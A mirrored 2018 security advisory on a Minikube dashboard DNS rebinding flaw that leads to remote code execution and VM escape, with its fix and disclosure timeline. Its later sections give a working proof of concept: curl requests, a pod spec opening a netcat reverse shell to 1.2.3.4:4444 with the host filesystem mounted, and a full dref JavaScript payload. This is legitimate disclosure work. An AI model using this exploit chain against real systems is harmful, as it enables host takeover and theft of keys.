---
layout: post
title: "Minikube RCE & VM Escape"
date: 2018-10-11T16:02:48+00:00
author: serain
sitemap: false
keywords: ""
description: ""
---

# # Minikube RCE & VM Escape

The Kubernetes dashboard service on Minikube is vulnerable to DNS rebinding attacks that can lead to remote code execution on the host.

## ## Disclaimer

I originally published this on the [MWR Labs blog](https://labs.mwrinfosecurity.com/advisories/minikube-rce/). It is provided here as a mirror.

## ## Description

Minikube is a popular option for testing and developing locally for Kubernetes, and is part of the larger Kubernetes project.

The Kubernetes dashboard service on Minikube is vulnerable to DNS rebinding attacks that can lead to remote code execution on the host operating system.

This issue would typically be exploited via a malicious web page, for example through a watering hole or phishing attack.

## ## Impact

An attacker can obtain containerized remote code execution in the Minikube VM by posting a deployment to the Kubernetes dashboard. When using VirtualBox, VMWare Fusion or Xhyve, the attacker may also break out of the Minikube VM by mounting the host user's home directory

This attack can lead to persistent access to the host operating system.

## ## Cause

### ### Remote Code Execution

The Kubernetes dashboard is enabled by default on Minikube installations and is accessible on the Minikube VM on port 30000/TCP. The Minikube VM itself is provisioned on a host-only network, and as such is only intended to be accessed by the host.

A malicious web page may nonetheless interact with the dashboard through a DNS rebinding attack.

DNS rebinding allows a web page to bypass the Same-Origin Policy by dynamically manipulating the DNS records of a domain. For example, the domain attacker.com may initially map to an external IP address such as 1.2.3.4 to deliver a malicious JavaScript payload. The domain’s A record can then be remapped to an internal IP, such as 192.168.99.100. The JavaScript payload can then communicate with the internal IP without violating the Same-Origin Policy.

The Kubernetes dashboard service on a Minikube installation is vulnerable to DNS rebinding because:

* the Minikube VM uses predictable IP addresses (for example 192.168.99.100 for VirtualBox or 192.168.64.1 for Hyperkit)
* the service runs on a known port: 30000/TCP
* the service does not use HTTPS
* the service does not validate the HTTP Host header

### ### VM Escape

The VirtualBox, VMWare Fusion and Xhyve drivers will mount the host user's home directory by default. An attacker may configure a deployment to mount the home directory from the Minikube VM into a container. This essentially allows the attacker to break out of the Minikube VM. The image below illustrates the chain of mounts on a MacOS host:

![chain of mounts](https://alex.kaskaso.li/images/posts/minikube_mount_chain.png "chain of mounts"){: .center-image }

The attacker may then, for example, backdoor the user's .bash_profile, or retrieve private keys to gain access to other systems.

## ## Interim Workaround

The issue affects versions of Minikube prior to 0.30.0. If running on an affected version, it is recommended to disable the Kubernetes dashboard service from Minikube:

```
$ minikube addons disable dashboard
```

## ## Solution

The issue was fixed in release 0.30.0. It is recommended to upgrade.

The issue was remediated by:

* exposing the service through kubectl proxy instead of a NodePort
* validating the Host header from incoming HTTP requests matches the pattern 127.0.0.1:{port}
* exposing the dashboard service on a random port

## ## Technical Details

A malicious web page will start by triggering a DNS rebind against the Kubernetes dashboard to bypass the Same-Origin Policy. From then on, the page will be in a position to read responses from the dashboard.

The page can then issue a GET request to /api/v1/csrftoken/appdeploymentfromfile to obtain a valid CSRF token for a deployment from the dashboard. A curl request for obtaining a CSRF token is given below:

```
$ curl http://192.168.99.100:30000/api/v1/csrftoken/appdeploymentfromfile
{
  "token": "AQ_3pRIv6gjjoVkniBS9xK6tSqI:1538256679430"
}
```

The page can proceed to post an arbitrary deployment to the dashboard, using the above token to set the X-CSRF-TOKEN header. An attacker could, for example, create a deployment with a container that will connect a reverse shell back to the attacker. The attacker may also wish to mount the host user's home directory into the container, trivially breaking out of the container and hypervisor.

The deployment below will create a reverse shell back to an attacker at 1.2.3.4:4444 and mount the home directory of a MacOS user:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: dns-rebind-rce-poc
spec:
  containers:
  - name: busybox
    image: busybox:1.29.2
    command: ["/bin/sh"]
    args: ["-c", "nc 1.2.3.4 4444 -e /bin/sh"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /Users/
      type: Directory
```

A curl request that would create this deployment is given below:

```
$ curl 'http://192.168.99.100:30000/api/v1/appdeploymentfromfile' -H 'X-CSRF-TOKEN: eT3xz2k_26fNCBzPpIZ1-A1s-gE:1538254867049' -H 'Content-Type: application/json;charset=utf-8'  --data '{"name":"","namespace":"default","content":"apiVersion: v1\nkind: Pod\nmetadata:\n  name: dns-rebind-rce-poc\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.29.2\n    command: [\"/bin/sh\"]\n    args: [\"-c\", \"nc 1.2.3.4 4444 -e /bin/sh\"]\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\n      type: Directory\n","validate":true}'
```

As a result of the above request, the attacker will receive a reverse shell with access to the home directory:

```
~# nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [4.3.2.1] port 4444 [tcp/*] accepted (family 2, sport 55593)
ls -lh /host/Users/user/
total 124
drwxr-xr-x    1 1001     1001        1.8K Sep 29 14:19 .
drwxr-xr-x    1 1001     1001         160 Mar 30  2018 ..
drwx------    1 1001     1001          96 Aug 27 10:04 Applications
drwx------    1 1001     1001         128 Sep 24 17:45 Desktop
drwx------    1 1001     1001         160 Aug  8 18:29 Documents
drwx------    1 1001     1001        1.2K Sep 29 17:14 Downloads
drwx------    1 1001     1001        1.9K Jun 12 11:16 Library
drwx------    1 1001     1001          96 Mar 30  2018 Movies
drwx------    1 1001     1001         128 Apr  1 13:38 Music
drwx------    1 1001     1001         320 Sep  6 07:27 Pictures
drwxr-xr-x    1 1001     1001         544 Sep 29 12:54 Projects
drwxr-xr-x    1 1001     1001         128 Mar 30  2018 Public
drwxr-xr-x    1 1001     1001          96 Mar 30  2018 Scripts
drwxr-xr-x    1 1001     1001         128 May 27 21:46 VirtualBox VMs
```

## ## Proof of Concept

This section provides an implementation of the attack using MWR's DNS rebinding exploitation framework [dref](https://github.com/mwrlabs/dref).

To conduct the attack the docker-compose.yml should to be modified to expose 30000/TCP:

```yaml
services:
  api:
    ...
    ports:
      - 0.0.0.0:80:80
      - 0.0.0.0:30000:30000
```

The dref-config.yml should also be modified to create a subdomain pointing to the custom Minikube payload:

```yaml
targets:
  - target: "minikube"
    script: "minikube"
```

Finally, the custom payload should be stored in dref/scripts/src/payloads/minikube.js:

```javascript
import NetMap from 'netmap.js'
import * as network from '../libs/network'
import Session from '../libs/session'

// hosts and ports to check for Kubernetes dashboard
const hosts = ['192.168.99.100']
const ports = [30000]

// paths for fetching CSRF token and POSTing the deployment
const tokenPath = '/api/v1/csrftoken/appdeploymentfromfile'
const deployPath = '/api/v1/appdeploymentfromfile'
// payload to deploy
const deployment = `apiVersion: v1
kind: Pod
metadata:
  name: dns-rebind-rce-poc
spec:
  containers:
  - name: busybox
    image: busybox:1.29.2
    command: ["/bin/sh"]
    args: ["-c", "nc 1.2.3.4 4444 -e /bin/sh"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
`

const session = new Session()
const netmap = new NetMap()

// this function runs first on the original page
// it'll scan hosts/ports and open an iFrame for the rebind attack
async function main () {
  netmap.tcpScan(hosts, ports).then(results => {
    for (let h of results.hosts) {
      for (let p of h.ports) {
        if (p.open) session.createRebindFrame(h.host, p.port)
      }
    }
  })
}

// this function runs in rebinding iframes
function rebind () {
  // after this, the Origin maps to the Kubernetes dashboard host:port
  session.triggerRebind().then(() => {
    network.get(session.baseURL + tokenPath, {
      successCb: (code, headers, body) => {
        const token = JSON.parse(body).token

        network.postJSON(session.baseURL + deployPath, {
          'name': '',
          'namespace': 'default',
          'validate': true,
          'content': deployment
        }, {
          headers: {
            'X-CSRF-TOKEN': token
          }
        })
      }
    })
  })
}

if (window.args && window.args._rebind) rebind()
else main()
```

A Minikube user visiting http://minikube.{dref_domain}.com will be exploited and a reverse shell with the host’s file system mounted will be given to the attacker on 1.2.3.4:4444.

## ## Detailed Timeline

| 2018-09-29 | Issue communicated to Kubernetes security contact |
| 2018-10-02 | Confirmation of receipt by Kubernetes |
| 2018-10-04 | Kubernetes advise that the release the following day will remediate the issue |
| 2018-10-05 | Minikube 0.30.0 released with remediation |
